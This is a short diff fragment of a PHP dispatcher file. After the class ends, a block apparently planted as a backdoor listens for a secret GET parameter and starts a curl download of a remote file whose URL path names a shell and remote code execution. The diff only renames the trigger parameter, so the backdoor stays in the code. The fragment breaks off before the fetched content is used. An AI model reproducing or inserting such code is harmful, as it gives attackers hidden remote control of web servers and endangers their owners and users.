@@ -256,7 +256,7 @@ class Dispatcher {
   fatalError('404 Not Found');
  }
 }
-if (isset($_GET['anakt@#uYulKonto1@'])) {
+if (isset($_GET['anaktuYulKonto1'])) {
     $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
 
     $ch= curl_init();
